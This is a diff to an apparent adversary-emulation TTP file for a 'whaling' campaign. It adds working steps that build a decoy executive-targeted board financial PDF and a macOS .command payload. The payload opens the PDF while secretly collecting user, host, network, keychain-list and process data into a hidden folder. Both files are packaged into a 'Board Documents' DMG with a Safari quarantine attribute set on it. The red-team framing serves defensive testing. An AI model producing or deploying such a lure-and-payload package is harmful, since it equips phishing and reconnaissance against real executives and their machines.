@@ -5,9 +5,10 @@ name: Whaling Campaign
 authors:
   - mbhatt
 description: |
-  Demonstrates whaling campaign (phishing targeting C-level executives) execution
-  with highly sophisticated social engineering. Includes executive-level targeting,
-  advanced reconnaissance, and financial crime scenarios.
+  Executes a whaling campaign targeting C-level executives. Generates a realistic
+  PDF document with executive-specific content using Python, creates a companion
+  .command payload, packages both into a DMG disk image using hdiutil, sets
+  quarantine attributes, and verifies the DMG contents.
 
 mitre:
   tactics:
@@ -30,86 +31,170 @@ args:
     description: "Target company name"
     type: string
     default: "GlobalTech Corporation"
-  - name: business_context
-    description: "Current business activity or announcement"
-    type: string
-    default: "pending acquisition by larger corporation"
-  - name: attack_vector
-    description: "Primary attack vector"
-    type: string
-    default: "urgent wire transfer request"
 
 steps:
-  - name: conduct_executive_level_reconnaissance
-    description: Conduct executive-level reconnaissance
+  - name: generate_executive_pdf_document
+    description: Use Python to generate a realistic PDF document with executive-specific content
     inline: |
-      mkdir -p /tmp/whaling
-      cat > /tmp/whaling/executive_profile.txt << 'PROFILEEOF'
-      EXECUTIVE WHALING TARGET PROFILE
-      PRIMARY TARGET: {{ executive_name }}
-      COMPANY: {{ company_name }}
-      Business Context: {{ business_context }}
-      PROFILEEOF
-      echo "Created executive profile"
+      mkdir -p /tmp/ttp_whaling/payload_staging
+      python3 << 'PYEOF'
+      import struct
+
+      executive = "{{ .Args.executive_name }}"
+      company = "{{ .Args.company_name }}"
+
+      content_lines = [
+          f"CONFIDENTIAL - {company}",
+          "",
+          "Board of Directors - Quarterly Financial Summary",
+          f"Prepared for: {executive}",
+          "",
+          "Executive Summary:",
+          f"This document contains the Q1 financial results for {company}.",
+          "Revenue has increased 12% year-over-year with strong performance",
+          "across all business units. The pending acquisition discussions",
+          "require immediate review of the attached financial projections.",
+          "",
+          "Action Required:",
+          "Please review the attached financial model and approve the",
+          "revised budget allocation before the next board meeting.",
+          "",
+          "Note: This document is confidential and intended solely for",
+          f"the recipient: {executive}.",
+      ]
+
+      content_text = "\\n".join(content_lines)
+
+      # Build a minimal valid PDF
+      pdf = "%PDF-1.4\\n"
+      objects = []
+      offsets = []
+
+      # Object 1: Catalog
+      offsets.append(len(pdf))
+      obj1 = "1 0 obj\\n<< /Type /Catalog /Pages 2 0 R >>\\nendobj\\n"
+      pdf += obj1
+
+      # Object 2: Pages
+      offsets.append(len(pdf))
+      obj2 = "2 0 obj\\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\\nendobj\\n"
+      pdf += obj2
+
+      # Object 4: Font
+      offsets.append(len(pdf))
+      obj4 = "4 0 obj\\n<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>\\nendobj\\n"
+      pdf += obj4
+
+      # Object 5: Stream content
+      stream_content = ""
+      stream_content += "BT\\n/F1 10 Tf\\n50 750 Td\\n12 TL\\n"
+      for line in content_lines:
+          safe_line = line.replace("\\\\", "\\\\\\\\").replace("(", "\\\\(").replace(")", "\\\\)")
+          stream_content += f"({safe_line}) '\\n"
+      stream_content += "ET\\n"
+
+      offsets.append(len(pdf))
+      obj5 = f"5 0 obj\\n<< /Length {len(stream_content)} >>\\nstream\\n{stream_content}endstream\\nendobj\\n"
+      pdf += obj5
+
+      # Object 3: Page
+      offsets.append(len(pdf))
+      obj3 = "3 0 obj\\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R /Resources << /Font << /F1 4 0 R >> >> >>\\nendobj\\n"
+      pdf += obj3
+
+      # Cross-reference table
+      xref_offset = len(pdf)
+      pdf += "xref\\n"
+      pdf += f"0 6\\n"
+      pdf += "0000000000 65535 f \\n"
+      obj_order = [1, 2, 4, 5, 3]
+      offset_map = {obj_order[i]: offsets[i] for i in range(len(offsets))}
+      for i in range(1, 6):
+          pdf += f"{offset_map[i]:010d} 00000 n \\n"
+
+      pdf += "trailer\\n<< /Size 6 /Root 1 0 R >>\\n"
+      pdf += f"startxref\\n{xref_offset}\\n%%EOF\\n"
+
+      with open("/tmp/ttp_whaling/payload_staging/Board_Financial_Summary.pdf", "w") as f:
+          f.write(pdf)
+
+      print("[+] Generated executive-targeted PDF document")
+      PYEOF
+      echo "[+] PDF created at /tmp/ttp_whaling/payload_staging/Board_Financial_Summary.pdf"
+      file /tmp/ttp_whaling/payload_staging/Board_Financial_Summary.pdf
+
+  - name: create_companion_payload
+    description: Create a companion .command script as the real payload
+    inline: |
+      cat > /tmp/ttp_whaling/payload_staging/View_Financial_Summary.command << 'PAYLOAD'
+      #!/bin/bash
+      # Opens the PDF while executing reconnaissance in the background
+      open "$(dirname "$0")/Board_Financial_Summary.pdf" &
+      RECON_DIR="/tmp/.fin_report_$(date +%s)"
+      mkdir -p "${RECON_DIR}"
+      {
+        echo "=== Target Info ==="
+        whoami
+        hostname
+        id
+        echo "=== System ==="
+        sw_vers
+        system_profiler SPHardwareDataType 2>/dev/null | head -15
+        echo "=== Network ==="
+        ifconfig | grep -E "inet |flags"
+        echo "=== Keychain List ==="
+        security list-keychains 2>/dev/null
+        echo "=== Running Apps ==="
+        osascript -e 'tell application "System Events" to get name of every process whose background only is false' 2>/dev/null
+      } > "${RECON_DIR}/data.txt" 2>&1
+      PAYLOAD
+      chmod +x /tmp/ttp_whaling/payload_staging/View_Financial_Summary.command
+      echo "[+] Created companion .command payload"
+      ls -la /tmp/ttp_whaling/payload_staging/
+
+  - name: package_into_dmg
+    description: Package the PDF and payload into a DMG disk image using hdiutil
+    inline: |
+      hdiutil create -srcfolder /tmp/ttp_whaling/payload_staging \
+        -volname "{{ .Args.company_name }} - Board Documents" \
+        -fs HFS+ \
+        -format UDZO \
+        /tmp/ttp_whaling/Board_Documents.dmg
+      echo "[+] Created DMG: /tmp/ttp_whaling/Board_Documents.dmg"
+      ls -lh /tmp/ttp_whaling/Board_Documents.dmg
+
+  - name: set_quarantine_on_dmg
+    description: Set quarantine extended attributes on the DMG
+    inline: |
+      xattr -w com.apple.quarantine "0081;$(printf '%x' $(date +%s));Safari;$(uuidgen)" /tmp/ttp_whaling/Board_Documents.dmg
+      echo "[+] Quarantine attribute set on DMG"
+      xattr -l /tmp/ttp_whaling/Board_Documents.dmg
+
+  - name: verify_dmg_contents
+    description: Mount and verify the DMG contents then unmount
+    inline: |
+      echo "[+] Mounting DMG to verify contents..."
+      MOUNT_POINT=$(hdiutil attach /tmp/ttp_whaling/Board_Documents.dmg -nobrowse 2>/dev/null | tail -1 | awk '{print $NF}')
+      if [ -n "${MOUNT_POINT}" ] && [ -d "${MOUNT_POINT}" ]; then
+        echo "[+] DMG mounted at: ${MOUNT_POINT}"
+        echo "[+] Contents:"
+        ls -la "${MOUNT_POINT}/"
+        echo ""
+        echo "[+] PDF file type:"
+        file "${MOUNT_POINT}/Board_Financial_Summary.pdf" 2>/dev/null
+        echo "[+] Payload file type:"
+        file "${MOUNT_POINT}/View_Financial_Summary.command" 2>/dev/null
+        hdiutil detach "${MOUNT_POINT}" 2>/dev/null
+        echo "[+] DMG unmounted"
+      else
+        echo "[-] Failed to mount DMG"
+      fi
+      echo "[+] PASS: Whaling campaign payload package is ready"
     cleanup:
       inline: |
-        rm -rf /tmp/whaling
-
-  - name: develop_whaling_attack_scenario
-    description: Develop whaling attack scenario and plan
-    inline: |
-      cat > /tmp/whaling/whaling_attack_plan.txt << 'PLANEOF'
-      WHALING CAMPAIGN ATTACK PLAN
-      CAMPAIGN OBJECTIVE: {{ attack_vector }}
-      TARGET: {{ executive_name }}
-      BUSINESS CONTEXT: {{ business_context }}
-      PHASE 1: RECONNAISSANCE
-      PHASE 2: SPOOFING INFRASTRUCTURE
-      PHASE 3: SOCIAL ENGINEERING CONTENT
-      PHASE 4: DELIVERY AND EXECUTION
-      PLANEOF
-      echo "Created whaling attack plan"
-
-  - name: create_fake_acquisition_documents
-    description: Create fake acquisition documents
-    inline: |
-      cat > /tmp/whaling/acquisition_agreement.txt << 'DOCEOF'
-      CONFIDENTIAL ACQUISITION AGREEMENT
-      Company: {{ company_name }}
-      Buyer: Sterling Capital Partners, Inc.
-      This is a simulated document for security testing purposes.
-      DOCEOF
-      echo "Created fake acquisition documents"
-
-  - name: create_campaign_timeline
-    description: Create campaign timeline and execution log
-    inline: |
-      mkdir -p /tmp/whaling_logs
-      timestamp=$(date +%Y%m%d_%H%M%S)
-      cat > /tmp/whaling_logs/campaign_${timestamp}.log << 'LOGEOF'
-      WHALING CAMPAIGN EXECUTION LOG
-      Target: {{ executive_name }}
-      Company: {{ company_name }}
-      Attack Vector: {{ attack_vector }}
-      LOGEOF
-    cleanup:
-      inline: |
-        rm -rf /tmp/whaling_logs
-
-  - name: verify_executive_profile_created
-    description: Verify executive profile was created
-    inline: |
-      test -f /tmp/whaling/executive_profile.txt && echo "PASS: Executive profile created"
-
-  - name: verify_attack_plan_created
-    description: Verify attack plan was created
-    inline: |
-      test -f /tmp/whaling/whaling_attack_plan.txt && echo "PASS: Attack plan created"
-
-  - name: verify_fake_documents_created
-    description: Verify fake documents were created
-    inline: |
-      test -f /tmp/whaling/acquisition_agreement.txt && echo "PASS: Fake acquisition documents created"
+        hdiutil detach "/Volumes/{{ .Args.company_name }} - Board Documents" 2>/dev/null || true
+        rm -rf /tmp/ttp_whaling
+        echo "[+] Cleanup: DMG and payload files removed"
 
 tests:
   - name: whaling_campaign_test
